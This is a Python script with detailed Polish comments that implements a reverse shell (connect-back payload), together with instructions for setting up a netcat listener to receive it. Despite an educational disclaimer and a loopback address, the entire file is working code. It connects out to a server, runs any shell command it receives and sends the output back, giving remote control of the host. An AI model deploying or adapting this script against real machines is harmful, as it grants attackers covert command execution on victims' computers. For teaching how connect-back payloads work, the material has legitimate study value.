# connect_back_payload.py
# Przykład skryptu realizującego funkcję odwrotnej powłoki
# (reverse shell) lub inaczej ładunku typu connect-back

#####################################################################
#                                                                   #
# DISCLAIMER:                                                       #
# Tego skryptu należy używać WYŁĄCZNIE w celach edukacyjnych        #
# i w celu demonstracji działania ładunku typu connect-back.        #
# Tego skryptu NIE NALEŻY używać w celu uzyskania zdalnego dostępu  #
# do komputerów innych osób bez ich wiedzy i wyraźnej zgody.        #
# NIE POPIERAM i NIE ZACHĘCAM do ŻADNYCH nielegalnych działań       #
#                                                                   #
#####################################################################

# Tego typu skrypty wykorzystuje się w celu uzyskania zdalnego
# dostępu do czyjegoś komputera w sytuacji, w której nie jest możliwe
# zainicjowanie połączenia z hostem docelowym, np. przez NAT.
# Skrypt działa w trybie klienta, łączy się z serwerem TCP, odbiera
# od niego polecenia powłoki, które wykonuje i zwraca wynik do serwera.
# Testowy serwer można utworzyć korzystając z programu netcat
# dostępnego na systemach Linux i macOS.
# Sposób użycia:
# $ nc -l 1337
# nc -> nazwa polecenia netcat
# -l -> opcja ustawiająca program w tryb nasłuchiwania (serwera)
# 1337 -> numer portu, na którym netcat nasłuchuje połączeń.
# Skrypt połączy się z serwerem netcata, na którego terminalu pojawi się
# znak zachęty ">" wskazujący na prośbę o wpisanie polecenia.

# ta biblioteka jest potrzebna do przeprowadzania operacji sieciowych
import socket

# ta biblioteka pozwala na wykonywanie poleceń powłoki
import subprocess

# hardcodowane stałe konfiguracyjne:
# adres IPv4 serwera
SERVER_ADDR = "127.0.0.1"  # Adres tzw. pętli zwrotnej (local loopback)

# numer portu serwera
SERVER_PORT = 1337  # https://www.speedguide.net/port.php?port=1337 ;)

# wykorzystanie bloku try-except oznaczaz
# że spodziewamy się wystąpienia potencjalnego błędu
try:

    # Tworzymy obiekt gniazda, który posłuży do komunikacji z serwerem
    # Korzystając z konstrukcji with, nie przejmujemy się zamknięciem gniazda,
    # konstrukcja with zrobi to za nas.
    # funkcja socket przyjmuje argumenty: rodzina i typ
    # rodzina AF_INET oznacza, że będziemy korzystać z IPv4
    # typ SOCK_STREAM informuje, że zostanie użyty protokół TCP
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:

        # Połączenie się z serwerem
        client.connect((SERVER_ADDR, SERVER_PORT))

        # Nieskończona pętla w której będzie miała miejsce
        # komunikacja z serwerem i wykonywanie poleceń powłoki
        while True:

            # Wysyłamy do serwera znak zachęty w postaci bajtów,
            # ponieważ metoda send oczekuje danych w formie bajtów
            client.send(b'> ')

            # Odbieramy od serwera komendę długości maksymalnie 2048 bajtów
            # do wykonania na komputerze.
            # Metoda recv zwraca bajty, dlatego dekodujemy komendę na tekst,
            # dodatkowo pozbawiając ją znaku nowego wiersza na końcu dzięki
            # metodzie strip
            cmd = client.recv(2048).decode().strip()

            # Jeśli zmienna przechowująca komendę ma wartość QUIT,
            # skrypt kończy działanie
            if cmd == 'QUIT':
                quit()

            # Spodziewamy się, że wykonanie polecenia powłoki
            # może zakończyć się niepowodzeniem.
            try:

                # Wykonujemy polecenie powłoki i zapamiętujemy rezultat
                # w zmiennej result
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)

                # Odsyłamy wynik wykonania polecenia do serwera.
                # Metoda subprocess.check_output zwraca rezultat w postaci bajtów,
                # dlatego konwersja jest zbędna.
                client.send(result)

            except Exception as e:

                # Jeśli wykonanie polecenia powłoki nie powiodło się,
                # wysyłamy do serwera informację o błędzie
                error_message = bytes(str(e) + "\n", 'utf-8')
                client.send(error_message)

except socket.error as err:

    # Jeśli wystąpił błąd związany z połączeniem sieciowym
    # wypisujemy na ekran komunikat o błędzie
    # i skrypt kończy działanie
    print(err)
    quit()